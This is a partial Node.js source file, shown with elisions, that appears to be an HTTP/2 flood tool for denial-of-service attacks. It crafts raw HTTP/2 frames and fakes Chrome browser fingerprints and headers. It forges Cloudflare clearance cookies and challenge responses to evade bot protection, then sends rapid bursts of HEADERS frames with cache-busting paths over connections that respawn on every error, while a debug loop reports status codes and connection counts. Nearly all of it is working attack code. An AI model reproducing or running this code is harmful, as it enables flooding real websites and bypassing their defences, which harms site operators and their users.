...
function decodeFrame(data) {
    ...
    if (type !== 1) return { type, length }; // Skip non-HEADERS
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5);
    let payloadStart = 9;
    let totalPayloadLen = length;
    if (flags & 0x20) { // PADDED
        if (data.length < 10) return null;
        const padLen = data.readUInt8(9);
        payloadStart += 1;
        totalPayloadLen -= (1 + padLen);
    }
    if (data.length < payloadStart + totalPayloadLen) return null;
    const payload = data.subarray(payloadStart, payloadStart + totalPayloadLen);
...
function generateCfClearanceCookie() {
    ...
    const hashPart = crypto
        .createHash('sha256')
        .update(`\( {clientId} \){timestamp}\( {fingerprint.ja3} \){fingerprint.navigator?.userAgent || ''}`)
        .digest('hex')
        .substring(0, 32);
...
function generateChallengeHeaders() {
    ...
    const challengeResponse = crypto
        .createHash('sha256')
        .update(`\( {challengeToken} \){fingerprint.canvas}\( {fingerprint.webgl || ''} \){timestamp}`)
        .digest('hex');
...
function generateBrowserFingerprint() {
    ...
    return {
        ...
        navigator: {
            ...
            userAgent: userAgent,
            secChUa: fakeBot ? '"Not A;Brand";v="99", "Chromium";v="130"' : `"Google Chrome";v="\( {rdversion}", "Chromium";v=" \){rdversion}", "Not?A_Brand";v="24"`,
            deviceMemory: 8,
            maxTouchPoints: 10,
            webdriver: false,
            cookiesEnabled: true
...
let cachedPseudoHeaders = null;
let cachedRegularHeaders = null;
let cachedHpack = null;

function generateCachedHeaders(fingerprint) {
    const chromeVersion = getRandomInt(119, 131);
    const baseHeaders = [
        [":method", reqmethod],
        ...
        ["accept-encoding", "gzip, deflate, br, zstd"],
        ["sec-ch-ua", `"Google Chrome";v="\( {chromeVersion}", "Chromium";v=" \){chromeVersion}", "Not?A_Brand";v="24"`],
        ["sec-ch-ua-mobile", "?0"],
        ...
        ...(customHeaders ? customHeaders.split('#').map(h => { const [n, v] = h.split(':'); return [n.trim().toLowerCase(), v.trim()]; }) : [])
    ];
    const hpack = new HPACK();
    hpack.setTableSize(65536);
    const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(baseHeaders)]);
    return { packed, hpack };
}

function encodeGoAway(lastStreamId = 0, errorCode = 0) {
    const payload = Buffer.alloc(8);
    payload.writeUInt32BE(lastStreamId, 0);
    payload.writeUInt32BE(errorCode, 4);
    return encodeFrame(0, 7, payload);
}

const burstSize = isFull ? 200 : 20;
const maxWindow = 16777215;
const connMultiplier = 3;

function go() {
    for (let c = 0; c < connMultiplier; c++) {
        setTimeout(() => spawnConn(), c * 1);
    }
}
...
function spawnConn() {
    ...
    const netSocket = net.connect({
        ...
        rawConnections++;
        const { packed, hpack } = generateCachedHeaders(fingerprint);
        cachedHpack = hpack;
        cachedPseudoHeaders = packed;
        ...
        tlsSocket = tls.connect({
            ...
            windowUpdate.writeUInt32BE(maxWindow, 0);
            const frames = [
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, settingsPayload),
                encodeFrame(0, 8, windowUpdate),
                encodeFrame(0, 8, windowUpdate)
            ];
            ...
            function main() {
                ...
                const burstFrames = [];
                const localRatelimit = randrate ? getRandomInt(ratelimit, ratelimit * 2) : ratelimit;
                for (let i = 0; i < burstSize; i++) {
                    if (streamId > 1000) streamId = 1;
                    let path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                    const thisPacked = Buffer.alloc(cachedPseudoHeaders.length);
                    cachedPseudoHeaders.copy(thisPacked);
                    const flags = 0x05;
                    burstFrames.push(encodeFrame(streamId, 1, thisPacked, flags));
                    streamId += 2;
                }
                tlsSocket.write(Buffer.concat(burstFrames), (err) => {
                    if (err) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }
                });
                setTimeout(main, isFull ? 1 : 50 / localRatelimit);
            }
            if (isFull) {
                setTimeout(main, 1);
            } else {
                setTimeout(main, 50 / ratelimit);
            }
        }).on('error', () => {
            tlsSocket?.destroy();
        });
        ...
        if (tlsSocket) {
            tlsSocket.end(() => {
                tlsSocket.destroy();
                setTimeout(spawnConn, 10);
            });
        }
    });

    netSocket.on('error', () => setTimeout(spawnConn, 10)).on('close', () => setTimeout(spawnConn, 10));
}
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            const statusString = Object.entries(statuses)
                ...
                .join(', ');
            console.clear();
            console.log(`[\( {chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Codes: [ \){statusString}] | Conns: ${totalConnections}`);
            rawConnections = 0;
        }, 500);
    }
